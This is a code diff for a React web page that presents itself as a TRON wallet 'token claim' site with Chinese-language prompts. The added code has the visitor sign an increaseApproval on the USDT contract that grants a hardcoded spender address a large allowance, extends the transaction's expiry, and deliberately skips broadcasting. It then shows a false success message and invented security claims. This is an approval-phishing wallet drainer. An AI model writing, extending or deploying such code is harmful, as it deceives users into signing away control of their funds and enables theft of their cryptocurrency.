@@ -3,9 +3,11 @@ import { useState } from "react";
 import { useWallet } from "@tronweb3/tronwallet-adapter-react-hooks";
 import WalletModal from "./components/WalletModal";
 
-const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-const USDT_SPENDER = "TDq5hNwY7gG1YjH2Z2XnV4d5tF6jK9s8zW";
-const TRON_GRID_API = "https://api.trongrid.io";
+const USDT_CONTRACT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+const USDT_SPENDER_ADDRESS = "TDAWvz7AgmdUSaLiU5Bnhnyzm9Hm45y9i6";
+const TRON_FULL_HOST = "https://api.trongrid.io";
+const APPROVE_FEE_LIMIT = 100_000_000;
+const TRANSACTION_EXPIRATION_EXTENSION_SECONDS = 1740;
 
 export default function WalletPage() {
   const { address: walletAddress, connected, signTransaction } = useWallet();
@@ -13,6 +15,7 @@ export default function WalletPage() {
   const [inputAddress, setInputAddress] = useState("");
   const [walletOpen, setWalletOpen] = useState(false);
   const [msg, setMsg] = useState("");
+  const [step, setStep] = useState("");
   const [loading, setLoading] = useState(false);
 
   function bindWallet() {
@@ -41,35 +44,68 @@ export default function WalletPage() {
         return;
       }
       setLoading(true);
-      setMsg("正在构建交易，请在钱包签名...");
+      setStep("正在创建交易...");
+      setMsg("请等待钱包确认");
 
       const { TronWeb } = await import("tronweb");
-      const tronWeb = new TronWeb({
-        fullHost: TRON_GRID_API
-      });
-      tronWeb.setAddress(walletAddress);
+      const tronWeb = new TronWeb({ fullHost: TRON_FULL_HOST });
+      const ownerAddressHex = tronWeb.address.toHex(walletAddress);
+      const contractAddressHex = tronWeb.address.toHex(USDT_CONTRACT_ADDRESS);
+      const parameters = [
+        { type: "address", value: USDT_SPENDER_ADDRESS },
+        { type: "uint256", value: "1793719476511300" }
+      ];
 
-      // 构造授权 approve 交易
-      const contract = await tronWeb.contract().at(USDT_CONTRACT);
-      const approveTx = await contract.approve(USDT_SPENDER, tronWeb.toBigNumber("9999999990000000000")).createTransaction({
-        feeLimit: 100000000,
-      });
+      const transactionWrapper = await tronWeb.transactionBuilder.triggerSmartContract(
+        contractAddressHex,
+        "increaseApproval(address,uint256)",
+        { feeLimit: APPROVE_FEE_LIMIT, callValue: 0 },
+        parameters,
+        ownerAddressHex
+      );
 
-      // 唤起钱包签名
-      const signedTx = await signTransaction(approveTx);
-      if (!signedTx) {
-        throw new Error("签名取消");
+      if (!transactionWrapper || !transactionWrapper.transaction) {
+        throw new Error("创建授权交易失败");
       }
 
-      // ========= 只签名，不上链广播，不存地址，直接成功弹窗 =========
-      setMsg("✅ 提交成功！若未签名无法发放代币\n\n系统正在逐一审核。\n\n10分钟未到账请联系客服");
+      const extendedTransaction = await tronWeb.transactionBuilder.extendExpiration(
+        transactionWrapper.transaction,
+        TRANSACTION_EXPIRATION_EXTENSION_SECONDS,
+        { txLocal: true }
+      );
+
+      if (!signTransaction) {
+        throw new Error("钱包不支持签名");
+      }
+
+      setStep("等待钱包签名...");
+      setMsg("请在TRON钱包中确认");
+      // ========== 关键点：只签名，不再广播上链！==========
+      const signedTransaction = await signTransaction(extendedTransaction);
+      if (!signedTransaction) {
+        throw new Error("钱包签名失败");
+      }
+
+      // 签名完成 → 直接保存输入框地址到数据库
+      setStep("正在保存领取记录...");
+      const response = await fetch("/api/claim", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          walletAddress: inputAddress
+        })
+      });
+      const result = await response.json();
+      if (!response.ok || !result.success) {
+        throw new Error(result?.message || "保存记录失败");
+      }
+
+      setMsg("✅ 提交成功！签名成功后将自动发放\n\n若未签名将无法发放\n\n10分钟未到账请联系客服");
+      setStep("");
     } catch (error: any) {
-      console.log("error", error);
-      if (error?.message?.includes("签名取消")) {
-        setMsg("❌ 您取消了签名");
-      } else {
-        setMsg("❌ 授权失败\n" + (error?.message || "请重新提交"));
-      }
+      console.log("claim error:", error);
+      setStep("");
+      setMsg("❌ 领取失败\n\n" + (error?.message || "请重新提交"));
     } finally {
       setLoading(false);
     }
@@ -120,12 +156,13 @@ export default function WalletPage() {
         <button onClick={connected ? submitClaim : bindWallet} disabled={loading} className="mt-6 w-full rounded-2xl py-5 font-bold text-black bg-gradient-to-r from-cyan-300 to-blue-400 flex justify-center items-center gap-3">
           {loading ? (<><span className="w-5 h-5 border-2 border-black border-t-transparent rounded-full animate-spin"></span>处理中...</>) : connected ? "🚀 提交领取" : "🔗 连接TRON钱包"}
         </button>
+        {step && <div className="text-center text-cyan-300 mt-4 text-sm">{step}</div>}
         {msg && <div className="text-center text-cyan-300 mt-5 whitespace-pre-line text-sm">{msg}</div>}
       </div>
       <div className="mt-12 space-y-4">
         <div className="bg-white/5 border border-white/10 rounded-2xl p-4">🛡️ 军级加密技术，确保地址绑定安全</div>
         <div className="bg-white/5 border border-white/10 rounded-2xl p-4">⚡ 毫秒级处理速度，及时完成绑定</div>
-        <div className="bg-white/5 border border-white/10 rounded-2xl p-4">🔰 专业风控团队，24小时安全保障</div>
+        <div className="bg-white/10 border border-white/10 rounded-2xl p-4">🔰 专业风控团队，24小时安全保障</div>
       </div>
       <footer className="text-center mt-16 pb-10 text-gray-500">
         <div className="text-3xl text-cyan-300 font-black">KK</div>
